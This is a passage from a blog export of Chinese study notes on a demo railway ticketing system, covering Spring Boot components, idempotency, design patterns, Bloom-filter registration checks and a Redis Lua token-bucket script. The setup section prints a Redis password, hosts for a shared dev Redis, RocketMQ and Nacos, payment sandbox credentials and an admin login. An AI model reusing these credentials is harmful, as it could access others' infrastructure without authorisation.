System.out.println(&quot;i:&quot; + i + &quot;,cost:&quot; + totCost);</span><br><span class="line">    &#125;</span><br><span class="line">    return totCost;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
        <tag>go</tag>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title>project_12306</title>
    <url>/2024/11/07/project-12306/</url>
    <content><![CDATA[<p><a href="https://wx.zsxq.com/group/51121244585524/topic/1522484552155512">【5星】12306铁路购票系统 - 适合有项目经验同学重点学习，校招可面试&amp;社招学习架构-知识星球</a></p>
<p>详细介绍：<a href="https://articles.zsxq.com/id_fntapw9t9qbx.html">什么是12306铁路购票系统？</a></p>
<p>项目地址：<a href="https://gitee.com/nageoffer/12306">12306: 🔥 官方推荐 🔥 大学春招、秋招、应届项目，SpringBoot3 + Java17 + SpringCloud Alibaba + Vue3 等技术架构，完成高仿铁路 12306 用户 + 抢票 + 订单 + 支付服务，帮助学生主打就业的项目。</a></p>
<p>语雀文档：<a href="https://www.yuque.com/magestack/12306">拿个offer-12306</a></p>
<span id="more"></span>

<p>[toc]</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>中间件环境：<a href="https://www.yuque.com/magestack/12306/gu8d4uvn5cdzuig9">安装中间件环境</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-Dspring.data.redis.password=Sm9sVXBOYJjI030b5tz0trjpzvZzRhtZmEbv0uOImcD1wEDOPfeaqNU4PxHob/Wp</span><br><span class="line">-Dspring.data.redis.port=19389</span><br><span class="line">-Dunique-name=-xcc20928</span><br><span class="line">-Dframework.cache.redis.prefix=xcc20928:</span><br><span class="line">-Dspring.data.redis.host=common-redis-dev.magestack.cn</span><br><span class="line">-Drocketmq.name-server=common-rocketmq-dev.magestack.cn:9876</span><br><span class="line">-Dspring.cloud.nacos.discovery.server-addr=common-nacos-dev.magestack.cn:8848</span><br></pre></td></tr></table></figure>

<p>控制台：<a href="https://www.yuque.com/magestack/12306/gu8d4uvn5cdzuig9#o6GGJ">安装中间件环境</a></p>
<p>支付回调相关问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要使用natapp 内网穿透映射到内网9000端口，然后启动程序</span><br><span class="line">获取对应外网地址</span><br><span class="line">然后修改notify-url</span><br></pre></td></tr></table></figure>

<p><a href="https://natapp.cn/article/natapp_newbie">NATAPP1分钟快速新手图文教程 - NATAPP-内网穿透 基于ngrok的国内高速内网映射工具</a></p>
<p>沙箱账号名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ahlbks5547@sandbox.com</span><br><span class="line">111111</span><br><span class="line"></span><br><span class="line">支付密码111111</span><br></pre></td></tr></table></figure>

<p>登录用户和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123456</span><br></pre></td></tr></table></figure>



<h2 id="了解系统"><a href="#了解系统" class="headerlink" title="了解系统"></a>了解系统</h2><h3 id="支付服务"><a href="#支付服务" class="headerlink" title="支付服务"></a>支付服务</h3><p>内网穿透、支付宝沙箱环境、支付过程中的消息回调</p>
<h3 id="项目模块结构"><a href="#项目模块结构" class="headerlink" title="项目模块结构"></a><strong>项目模块结构</strong></h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241107182338536.png" alt="image-20241107182338536"></p>
<h3 id="数据库梳理"><a href="#数据库梳理" class="headerlink" title="数据库梳理"></a>数据库梳理</h3><h2 id="基础组件库"><a href="#基础组件库" class="headerlink" title="基础组件库"></a>基础组件库</h2><h3 id="SpringBoot-Starter"><a href="#SpringBoot-Starter" class="headerlink" title="SpringBoot Starter"></a>SpringBoot Starter</h3><p><a href="https://cloud.tencent.com/developer/article/2342977">Spring Boot 3.x 自动配置详解-腾讯云开发者社区-腾讯云</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2398558">深入理解Spring Boot Starter：概念、特点、场景、原理及自定义starter-腾讯云开发者社区-腾讯云</a></p>
<p>之后编写的基础模块只需要导入即可</p>
<h3 id="基础组件模块"><a href="#基础组件模块" class="headerlink" title="基础组件模块"></a>基础组件模块</h3><p><code>index12306-base-spring-boot-starter</code> 在 12306 的整体规划中，属于顶层组件或基础组件。</p>
<p>那什么样的组件能被称为顶层？可以从几个方面去说明这个问题：</p>
<ul>
<li>兼容性：能够被所有组件或者所有客户端项目所依赖，不会存在兼容性的代码组件。</li>
<li>功能性：独立且公用的功能可被用户无感知依赖。比如当 fastjson 出现安全漏洞，可通过升级顶层组件来解决所有依赖包问题。</li>
</ul>
<p><strong>组件概览</strong></p>
<ol>
<li><p>定义全局配置常量和过滤器执行顺序。</p>
</li>
<li><p>封装 Spring 应用上下文 <code>ApplicationContextHolder</code>。</p>
</li>
<li><p>封装 FastJSON 安全模式，客户端可通过配置 <code>fastjson.safa-mode=true</code> 开启安全模式。</p>
</li>
<li><p>封装应用初始化事件，通过 Spring <code>ApplicationReadyEvent</code> 进行发布，并保证仅执行一次，<code>ApplicationInitializingEvent</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ContextRefreshedEvent： 当应用程序上下文（ApplicationContext）初始化或刷新完成后触发。这通常发生在应用程序启动过程中，并且表示应用程序已准备好接收请求和执行业务逻辑。可以使用该事件来执行一些初始化操作，例如加载缓存数据、启动后台任务等。</span><br><span class="line">有些场景是依赖 Spring 容器初始化完成后调用的，ContextRefreshedEvent 这个时间就比较合适。但是大家发现没有，它除了初始化调用，容器刷新也会调用。</span><br><span class="line">为了避免容器刷新造成二次调用初始化逻辑，我们对一些比较常用的事件简单封装了一层逻辑。</span><br></pre></td></tr></table></figure>
</li>
<li><p>单例对象容器，可避免重复创建对象，方便全局访问。</p>
</li>
</ol>
<h3 id="规约组件模块"><a href="#规约组件模块" class="headerlink" title="规约组件模块"></a>规约组件模块</h3><p>组件概述</p>
<ol>
<li>定义异常码抽象和公共异常码。</li>
<li>定义抽象异常和客户端、服务端以及远程调用异常。</li>
<li>封装分页对象请求参数和返回参数实体。<ul>
<li>提供出去的 API 包，包里有个对象用了分页对象。但是依赖这个包的客户端没有使用 MyBatisPlus，难道要因为一个分页对象，把整个 MyBatisPlus 包都依赖进去么？</li>
<li>随着现在技术架构发展日新月异，谁也不能保证哪个框架可以长久留存。如果强依赖 MyBatisPlus，后续如果换了 ORM 框架，对于整体修改是个灾难。</li>
</ul>
</li>
<li>封装公共响应对象。</li>
</ol>
<h3 id="用户基础组件库"><a href="#用户基础组件库" class="headerlink" title="用户基础组件库"></a><strong>用户基础组件库</strong></h3><p>组件概述</p>
<ol>
<li>通过 JWT 生成用户登录唯一凭证。</li>
<li>封装当前请求用户上下文。</li>
<li>拦截带 Token 的请求，并将 Token 解析放入用户上下文中。</li>
</ol>
<h3 id="设计模式组件库"><a href="#设计模式组件库" class="headerlink" title="设计模式组件库"></a><strong>设计模式组件库</strong></h3><p>组件概述</p>
<ol>
<li>封装构建者模式。</li>
<li>封装责任链模式</li>
<li>封装策略模式。</li>
</ol>
<h3 id="公共组件库"><a href="#公共组件库" class="headerlink" title="公共组件库"></a><strong>公共组件库</strong></h3><p>组件概述</p>
<ol>
<li>抽象常用枚举码值，比如：删除标记枚举、标识枚举、操作类型以及状态枚举等。</li>
<li>封装线程池相关功能，比如：线程池构造器、快速执行线程池、动态代理拒绝策略等。</li>
<li>常用工具类，比如：断言类、对象复制工具类、环境类以及线程工具类等。</li>
</ol>
<h3 id="持久层组件库"><a href="#持久层组件库" class="headerlink" title="持久层组件库"></a><strong>持久层组件库</strong></h3><p>组件概述</p>
<ol>
<li>封装通用分页组件。</li>
<li>封装数据持久层基础属性。</li>
<li>封装元数据处理器。</li>
<li>封装分页工具转换器。</li>
<li>封装自定义雪花算法。</li>
</ol>
<h3 id="分布式ID组件库"><a href="#分布式ID组件库" class="headerlink" title="分布式ID组件库"></a><strong>分布式ID组件库</strong></h3><p>组件概述</p>
<ol>
<li>实现分布式唯一雪花算法 ID 生成器。</li>
<li>封装分布式唯一雪花算法 ID 工具类。</li>
<li>封装分库或分表基因算法工具类。</li>
</ol>
<h3 id="日志组件库"><a href="#日志组件库" class="headerlink" title="日志组件库"></a><strong>日志组件库</strong></h3><p>组件概述</p>
<ol>
<li>方法或类上添加日志打印注解并打印日志</li>
</ol>
<p><a href="https://blog.csdn.net/xhaimail/article/details/134443453">Java 中 Method 和 MethodSignature 区别-CSDN博客</a></p>
<h3 id="幂等组件库"><a href="#幂等组件库" class="headerlink" title="幂等组件库"></a><strong>幂等组件库</strong></h3><p>组件概述</p>
<ul>
<li>实现消息队列 RocketMQ、Kafka、ActiveMQ、RabbitMQ 等客户端消费幂等。</li>
</ul>
<p>当我们说一个接口支持幂等性时，无论调用多少次，系统的结果都保持一致。</p>
<p>一般我们在系统中，幂等可能存在两种类型的问题：</p>
<ul>
<li>接口幂等：常说的接口防重复提交。</li>
<li>消息队列幂等：如何保障消息队列客户端对相同的消息仅消费一次。</li>
</ul>
<p>如何解决幂等问题？主要涵盖分布式锁、Token 令牌以及去重表</p>
<ol>
<li>分布式锁</li>
</ol>
<p>当用户提交请求时，服务器端可以生成一个唯一的标识，例如使用 UUID。</p>
<p>在处理用户请求之前，服务器尝试获取一个分布式锁。如果成功获取到分布式锁，那么则执行接下来的正常业务逻辑流程。因为锁已经被获取，这样可以确保其他请求无法使用相同的标识，避免重复处理。在请求处理完成后，服务器需要释放分布式锁。</p>
<ol start="2">
<li>Token 令牌</li>
</ol>
<p>为了防止重复操作，客户端在第一次调用业务请求之前会发送一个获取 Token 的请求。服务端会生成一个全局唯一的 ID 作为 Token，并将其保存在 Redis 中，同时将该 ID 返回给客户端。</p>
<p>在客户端进行第二次业务请求时，必须携带这个 Token。</p>
<p>服务端会验证这个 Token，如果验证成功，则执行业务逻辑并从 Redis 中删除该 Token。</p>
<p>如果验证失败，说明 Redis 中已经没有对应的 Token，表示重复操作，服务端会直接返回指定的结果给客户端。</p>
<p><a href="https://blog.csdn.net/A_art_xiang/article/details/132106309">接口幂等性解决方案：基于token实现接口幂等的落地实现_用token机制解决幂等性问题-CSDN博客</a></p>
<ol start="3">
<li>去重表</li>
</ol>
<p>去重表是指在使用 Redis 或者 MySQL 作为存储时，为了实现幂等性而用于记录已经处理过的请求或操作，以防止重复执行。大部分场景下，大家会使用 Redis 作为去重组件实现。</p>
<p>去重表只是一个说法，存储到 Redis 的话，其实就是一个 String 的 Key 而已。</p>
<p>具体来说，当客户端发送请求时，服务端会先查询 Redis 去重表来检查该请求是否已经被处理过。如果在存在对应的记录，表示请求已经执行过，服务端可以直接返回之，而不再执行重复操作。如果在不存在对应的记录，表示请求是新的，服务端会执行相应的业务逻辑，并在处理完成后将请求的唯一标识（如请求 ID 或标识）添加到 Redis 去重表中，以便后续的重复请求可以被正确识别和处理。</p>
<p>另外，如果消息已经在消费中，抛出异常，消息会触发延迟消费，在消息队列消费失败的场景下即发送到重试队列 <code>RETRY TOPIC</code></p>
<p>对应讲解文章：<a href="https://www.yuque.com/magestack/12306/xoea6i2yluci1w0q">手摸手实现幂等组件库</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241126165043977.png" alt="image-20241126165043977"></p>
<h3 id="Web组件库"><a href="#Web组件库" class="headerlink" title="Web组件库"></a><strong>Web组件库</strong></h3><p>组件概述</p>
<ol>
<li>定义全局异常处理器。</li>
<li>全局返回对象构造器。</li>
<li>项目启动后初始化调用 HTTP 请求，增加第一次访问速度。</li>
</ol>
<h2 id="相关设计模式"><a href="#相关设计模式" class="headerlink" title="相关设计模式"></a>相关设计模式</h2><h3 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h3><p>在实际购票业务场景中，用户发起一次购票请求后，购票接口在真正完成创建订单和扣减余票行为前，需要验证当前请求中的参数是否正常请求，或者说是否满足购票情况。</p>
<ol>
<li>购票请求用户传递的参数是否为空，比如：车次 ID、乘车人、出发站点、到达站点等。</li>
<li>购票请求用户传递的参数是否正确，比如：车次 ID 是否存在、出发和到达站点是否存在等。</li>
<li>需要购票的车次是否满足乘车人的数量，也就是列车对应座位的余量是否充足。</li>
<li>乘客是否已购买当前车次，或者乘客是否已购买当天时间冲突的车次。</li>
<li>可能实际场景中需要验证的还有很多……</li>
</ol>
<p>实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 定义抽象处理器接口：通过TrainPurchaseTicketChainFilter接口定义责任链的标识和处理方法。</span><br><span class="line">2. 实现具体处理器：各个具体处理器实现TrainPurchaseTicketChainFilter接口，并定义自己的处理逻辑和执行顺序。</span><br><span class="line">3. 创建责任链上下文：AbstractChainContext类负责从Spring IOC容器中获取处理器并按标识分类存储，同时提供方法执行责任链。</span><br><span class="line">4. 客户端调用责任链：购票服务类通过调用责任链上下文的方法执行责任链中的处理器。</span><br></pre></td></tr></table></figure>

<p>相关文章：<a href="https://cloud.tencent.com/developer/article/1656704">SpringBoot2.x基础篇：使用CommandLineRunner或ApplicationRunner-腾讯云开发者社区-腾讯云</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241107192248416.png" alt="image-20241107192248416"></p>
<p>并且可以看到这个是在this.refreshContext(context) 后面执行的，即bean初始化完成后执行的</p>
<h3 id="抽象策略模式"><a href="#抽象策略模式" class="headerlink" title="抽象策略模式"></a>抽象策略模式</h3><p>策略设计模式（Strategy Pattern）是一种面向对象设计模式，它定义了一系列算法，并将每个算法封装起来，使它们可以相互替换。这种模式使得算法可以独立于使用它们的客户端而变化。</p>
<p>策略设计模式包含三个主要的角色：</p>
<ol>
<li>环境（Context）：持有一个策略对象，并调用其算法。</li>
<li>策略（Strategy）：定义了一组算法，并将每个算法封装起来，使它们可以相互替换。</li>
<li>具体策略（ConcreteStrategy）：实现了策略接口，提供了具体的算法实现。</li>
</ol>
<p>在策略设计模式中，环境持有一个策略对象，并通过调用策略的算法来完成具体的任务。策略对象可以根据需要进行替换，从而实现不同的算法实现，并且可以在运行时动态地更改策略对象。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241126153844677.png" alt="image-20241126153844677"></p>
<h3 id="装饰者模式"><a href="#装饰者模式" class="headerlink" title="装饰者模式"></a>装饰者模式</h3><p>装饰者模式实际上就是将“父对象”的职责动态地加在“子对象”之上，“子对象”可以根据需要，在本有职责的基础上添加其他的业务。换句话说，若要拓展功能，装饰者设计模式比继承提供了更加富有弹性的解决方案。</p>
<p>它的设计原则一是尽可能多地使用组合，而尽可能少的使用继承，因为继承是在编译时决定的，是一种”静态“的功能拓展，而应用组合对功能进行拓展，则更富有灵活性。二是似的类对拓展开放而对修改关闭。</p>
<p>装饰者模式要求，装饰者与被装饰者需要有同一超类，其目的是为了让装饰者与被装饰者对象的类型能够匹配，而绝非是继承其行为。装饰者模式将保持接口，并增加对象的职责。</p>
<p><a href="https://zhuanlan.zhihu.com/p/43368677">Java设计模式12：装饰器模式 - 知乎</a></p>
<h3 id="模板方法"><a href="#模板方法" class="headerlink" title="模板方法"></a>模板方法</h3><p><a href="https://blog.csdn.net/zxd1435513775/article/details/120080387">Java设计模式——模板方法模式【Template Method Pattern】_java 模板模式-CSDN博客</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#org.opengoofy.index12306.framework.starter.idempotent.core.AbstractIdempotentExecuteHandler#execute</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(ProceedingJoinPoint joinPoint, Idempotent idempotent)</span> &#123;</span><br><span class="line">    <span class="comment">// 模板方法模式：构建幂等参数包装器</span></span><br><span class="line">    <span class="type">IdempotentParamWrapper</span> <span class="variable">idempotentParamWrapper</span> <span class="operator">=</span> buildWrapper(joinPoint).setIdempotent(idempotent);</span><br><span class="line">    handler(idempotentParamWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="核心业务"><a href="#核心业务" class="headerlink" title="核心业务"></a>核心业务</h2><h3 id="发起一笔支付"><a href="#发起一笔支付" class="headerlink" title="发起一笔支付"></a><strong>发起一笔支付</strong></h3><p><strong>支付流程</strong></p>
<ol>
<li>用户发起支付 org.opengoofy.index12306.biz.ticketservice.service.impl.TicketServiceImpl#purchaseTicketsV2<ul>
<li>选择列车购票</li>
<li>提交订单</li>
<li>支付宝付款</li>
<li>支付回调</li>
</ul>
</li>
<li>支付结果回调</li>
</ol>
<p><a href="https://blog.csdn.net/test1280/article/details/81274839">Lua：开源库 lua-cjson 安装及使用_lua cjson-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_45759791/article/details/107687466">try、catch、finally、return执行顺序超详解析（针对面试题）_try catch return finally-CSDN博客</a></p>
<h3 id="列车数据检索"><a href="#列车数据检索" class="headerlink" title="列车数据检索"></a><strong>列车数据检索</strong></h3><p>看完了</p>
<h3 id="注册用户防止缓存穿透"><a href="#注册用户防止缓存穿透" class="headerlink" title="注册用户防止缓存穿透"></a><strong>注册用户防止缓存穿透</strong></h3><p>常见解决方案</p>
<p>所以，在用户注册场景下，需要注意防止缓存穿透，常见的处理方式有下述这些：</p>
<ol>
<li><p>对不存在的 Key 进行缓存，值设为 Null，并设置短暂过期时间，如 60 秒。</p>
<p>为什么不行的具体例子：</p>
<p><strong>场景</strong>：用户B也来注册magestack，先查缓存，发现有个key为magestack，value为null的，就默认它没有被注册，然后等注册该用户名后，将再更新缓存中key为magestack的value。</p>
<p><strong>问题</strong>：这样想会导致之后60s内从缓存中查询到这个key的请求都得到当前用户未被使用的消息。就会造成之后在真正注册的时候，出现多个用户同时竞争这个用户名的情况，所以，在注册成功之前还得再检查一次数据库，看看这个用户名是不是先一步被别人注册了。这样会导致用户第一次查询用户名是否被使用的结果没多大意义，因为这个结果可能被多个人看见，然后一起竞争这个用户名，所以在实际注册成功前还得再查一下数据库，确认这个名字不存在才能注册。其次，如果在之后注册的时候，查询数据库，发现该用户名在数据库中已经存在了。就会出现第一次校验用户名的时候，显示用户名未被使用，实际注册的时候，却因为用户名已经被使用而注册失败。给用户带来极其差的体验。因此，这里缓存中的key应该默认为是已经被注册的名字。</p>
</li>
<li><p>使用布隆过滤器，将所有已注册的用户名存入布隆过滤器，判断时先判断该用户名是否在布隆过滤器中，不在的一定不存在，避免直接查询数据库。</p>
<p><a href="https://www.bilibili.com/video/BV1zK4y1h7pA/?vd_source=bb3f393110e93fc660e5cfc88276d061">程序员都必须会的技术，面试必备【布隆过滤器详解】，Redis缓存穿透解决方案_哔哩哔哩_bilibili</a></p>
</li>
<li><p>使用确定的数据结构如 Redis 的 Set 集合来存储已注册用户名，判断时检查是否在集合内。</p>
</li>
<li><p>针对高并发注册场景，可以先查询缓存，如果不命中则使用分布式锁来保证只有一个线程访问数据库，避免重复查询。</p>
</li>
</ol>
<p>上面的多少都有些问题</p>
<p>最终解决方案</p>
<p>通过再加一层缓存来解决布隆过滤器无法删除的问题</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241209153556277.png" alt="image-20241209153556277"></p>
<p>假设我们有一条用户名为 “mading” 的数据，注册后是如何不被重复注册，以及注销后又是如何能被再次使用的。</p>
<ol>
<li>用户名 “mading” 成功注册后，将其添加至布隆过滤器。</li>
<li>当其他用户查询”mading”是否已被使用时，首先检查布隆过滤器是否包含该用户名。</li>
<li>如果布隆过滤器中不存在该用户名，根据布隆过滤器的特点，可以确认该用户名一定没有被使用过，因此返回成功，证明该用户名可用。</li>
<li>如果布隆过滤器中存在该用户名，进一步检查Redis Set结构中是否包含该用户名。如果存在，表示该用户名已被注销，同样可被再次使用。</li>
<li>如果布隆过滤器中存在该用户名，但 Redis Set 结构中不存在，说明该用户名已被使用且尚未被注销，因此不可用。</li>
</ol>
<p>导致的问题：</p>
<ol>
<li>查询性能消耗增加：由于采用了额外的 Redis Set 结构，查询过程需要进行两次查询，一次是查询布隆过滤器，另一次是查询Redis Set结构，这导致查询性能相比之前有所增加。</li>
<li>存储损耗增加：相较于之前仅使用布隆过滤器的存储，现在需要额外存储 Redis Set 结构，这导致存储开销增加。</li>
</ol>
<p>还有一个问题：</p>
<p>如果用户频繁申请账号再注销，可能导致用户注销可复用的 Username Redis Set 结构变得庞大，增加了存储和查询的负担。</p>
<p>我采取了以下解决方案：</p>
<ol>
<li>异常行为限制：每次用户注销时，记录用户的证件号，并限制证件号仅可用于注销五次。超过这个限制的次数，将禁止该证件号再次用于注册账号。</li>
<li>缓存分片处理：对 Username Redis Set 结构进行分片。即使我们对异常行为进行了限制，如果有大量用户注销账户，存储这些数据在一个 Redis Set 结构中可能成为一个灾难，可能出现 Redis 大 Key 问题。因此，我将 Set 结构进行分片，根据用户名的 HashCode 进行取模操作，将数据分散存储在 1024 个 Set 结构中，从而有效地解决了这个问题。</li>
</ol>
<h3 id="注册用户"><a href="#注册用户" class="headerlink" title="注册用户"></a>注册用户</h3><p>看完</p>
<h3 id="乘车人模块开发"><a href="#乘车人模块开发" class="headerlink" title="乘车人模块开发"></a><strong>乘车人模块开发</strong></h3><p>关键词：幂等</p>
<p>看完</p>
<h3 id="敏感信息加密存储"><a href="#敏感信息加密存储" class="headerlink" title="敏感信息加密存储"></a><strong>敏感信息加密存储</strong></h3><p>关键词：ShardingSphere、AES</p>
<p>看完</p>
<h3 id="敏感信息展示脱敏"><a href="#敏感信息展示脱敏" class="headerlink" title="敏感信息展示脱敏"></a><strong>敏感信息展示脱敏</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@JsonSerialize(using = IdCardDesensitizationSerializer.class)</span><br></pre></td></tr></table></figure>

<p>使用自定义序列化器进行脱敏</p>
<h3 id="列车购票流程V1"><a href="#列车购票流程V1" class="headerlink" title="列车购票流程V1"></a><strong>列车购票流程V1</strong></h3><p>看完了</p>
<h3 id="列车购票流程V2"><a href="#列车购票流程V2" class="headerlink" title="列车购票流程V2"></a>列车购票流程V2</h3><p>加了令牌桶：</p>
<p>如果用户来购票，根据所选择的乘车人数量以及座位类型去令牌容器中获取，获取成功则表示余票充足，可以进入接下来的选票以及下单流程，获取失败则直接返回。</p>
<p>注意，令牌容器中的令牌是有限的，如果你获取到令牌后，令牌容器的数量会进行相应的减少，而这也是防止余票不超卖的原因之一。因为咱们的令牌数量和车票座位的余量是一一对应的。</p>
<p>v2还结合了本地锁</p>
<h3 id="余票如何保障缓存数据库一致性"><a href="#余票如何保障缓存数据库一致性" class="headerlink" title="余票如何保障缓存数据库一致性"></a><strong>余票如何保障缓存数据库一致性</strong></h3><p><a href="https://www.yuque.com/magestack/12306/wocbrht50ctg14nv">缓存与数据库一致性如何解决？</a></p>
<h3 id="高并发库存扣减为什么需要令牌限流"><a href="#高并发库存扣减为什么需要令牌限流" class="headerlink" title="高并发库存扣减为什么需要令牌限流"></a><strong>高并发库存扣减为什么需要令牌限流</strong></h3><p>以 12306 为背景，如何防止大量的用户请求无意义访问，因为票就那些，只有少数人能买到。为此，我们通过令牌来完成防止用户无意义访问以及库存扣减功能。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241127171109436.png" alt="image-20241127171109436"></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- keys:[index12306-ticket-service:ticket_availability_token_bucket:1, 北京南_杭州东]</span></span><br><span class="line"><span class="comment">-- keys[1] = String tokenBucketHashKey = TICKET_AVAILABILITY_TOKEN_BUCKET + requestParam.getTrainId();</span></span><br><span class="line"><span class="comment">-- args:</span></span><br><span class="line">    <span class="comment">-- [&#123;&quot;seatType&quot;:&quot;0&quot;,&quot;count&quot;:&quot;1&quot;&#125;,&#123;&quot;seatType&quot;:&quot;1&quot;,&quot;count&quot;:&quot;1&quot;&#125;]</span></span><br><span class="line">    <span class="comment">-- [&#123;&quot;endStation&quot;:&quot;济南西&quot;,&quot;startStation&quot;:&quot;北京南&quot;&#125;,&#123;&quot;endStation&quot;:&quot;南京南&quot;,&quot;startStation&quot;:&quot;北京南&quot;&#125;,&#123;&quot;endStation&quot;:&quot;杭州东&quot;,&quot;startStation&quot;:&quot;北京南&quot;&#125;,&#123;&quot;endStation&quot;:&quot;宁波&quot;,&quot;startStation&quot;:&quot;北京南&quot;&#125;,&#123;&quot;endStation&quot;:&quot;南京南&quot;,&quot;startStation&quot;:&quot;济南西&quot;&#125;,&#123;&quot;endStation&quot;:&quot;杭州东&quot;,&quot;startStation&quot;:&quot;济南西&quot;&#125;,&#123;&quot;endStation&quot;:&quot;宁波&quot;,&quot;startStation&quot;:&quot;济南西&quot;&#125;,&#123;&quot;endStation&quot;:&quot;杭州东&quot;,&quot;startStation&quot;:&quot;南京南&quot;&#125;,&#123;&quot;endStation&quot;:&quot;宁波&quot;,&quot;startStation&quot;:&quot;南京南&quot;&#125;]</span></span><br><span class="line"><span class="keyword">local</span> inputString = KEYS[<span class="number">2</span>] <span class="comment">-- 北京南_杭州东</span></span><br><span class="line"><span class="keyword">local</span> actualKey = inputString</span><br><span class="line"><span class="keyword">local</span> colonIndex = <span class="built_in">string</span>.<span class="built_in">find</span>(actualKey, <span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> colonIndex ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    actualKey = <span class="built_in">string</span>.<span class="built_in">sub</span>(actualKey, colonIndex + <span class="number">1</span>) <span class="comment">-- 北京南_杭州东</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> jsonArrayStr = ARGV[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">local</span> jsonArray = cjson.decode(jsonArrayStr)</span><br><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &#123; seatType = &quot;0&quot;, count = &quot;1&quot; &#125;,</span></span><br><span class="line"><span class="comment">  &#123; seatType = &quot;1&quot;, count = &quot;1&quot; &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--]]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line"><span class="keyword">local</span> tokenIsNull = <span class="literal">false</span></span><br><span class="line"><span class="keyword">local</span> tokenIsNullSeatTypeCounts = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, jsonObj <span class="keyword">in</span> <span class="built_in">ipairs</span>(jsonArray) <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> seatType = <span class="built_in">tonumber</span>(jsonObj.seatType)</span><br><span class="line">    <span class="keyword">local</span> count = <span class="built_in">tonumber</span>(jsonObj.count)</span><br><span class="line">    <span class="keyword">local</span> actualInnerHashKey = actualKey .. <span class="string">&quot;_&quot;</span> .. seatType <span class="comment">-- 北京南_杭州东_seatType</span></span><br><span class="line">    <span class="keyword">local</span> ticketSeatAvailabilityTokenValue = <span class="built_in">tonumber</span>(redis.call(<span class="string">&#x27;hget&#x27;</span>, KEYS[<span class="number">1</span>], <span class="built_in">tostring</span>(actualInnerHashKey)))</span><br><span class="line">    <span class="keyword">if</span> ticketSeatAvailabilityTokenValue &lt; count <span class="keyword">then</span></span><br><span class="line">        tokenIsNull = <span class="literal">true</span></span><br><span class="line">        <span class="built_in">table</span>.<span class="built_in">insert</span>(tokenIsNullSeatTypeCounts, seatType .. <span class="string">&quot;_&quot;</span> .. count) <span class="comment">--如果可用票数不足，记录不足的座位类型和需求票数到 tokenIsNullSeatTypeCounts</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">result[<span class="string">&#x27;tokenIsNull&#x27;</span>] = tokenIsNull</span><br><span class="line"><span class="keyword">if</span> tokenIsNull <span class="keyword">then</span></span><br><span class="line">    result[<span class="string">&#x27;tokenIsNullSeatTypeCounts&#x27;</span>] = tokenIsNullSeatTypeCounts</span><br><span class="line">    <span class="keyword">return</span> cjson.encode(result)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> alongJsonArrayStr = ARGV[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">local</span> alongJsonArray = cjson.decode(alongJsonArrayStr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, jsonObj <span class="keyword">in</span> <span class="built_in">ipairs</span>(jsonArray) <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> seatType = <span class="built_in">tonumber</span>(jsonObj.seatType)</span><br><span class="line">    <span class="keyword">local</span> count = <span class="built_in">tonumber</span>(jsonObj.count)</span><br><span class="line">    <span class="keyword">for</span> indexTwo, alongJsonObj <span class="keyword">in</span> <span class="built_in">ipairs</span>(alongJsonArray) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> startStation = <span class="built_in">tostring</span>(alongJsonObj.startStation)</span><br><span class="line">        <span class="keyword">local</span> endStation = <span class="built_in">tostring</span>(alongJsonObj.endStation)</span><br><span class="line">        <span class="keyword">local</span> actualInnerHashKey = startStation .. <span class="string">&quot;_&quot;</span> .. endStation .. <span class="string">&quot;_&quot;</span> .. seatType</span><br><span class="line">        redis.call(<span class="string">&#x27;hincrby&#x27;</span>, KEYS[<span class="number">1</span>], <span class="built_in">tostring</span>(actualInnerHashKey), -count)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cjson.encode(result)</span><br></pre></td></tr></table></figure>

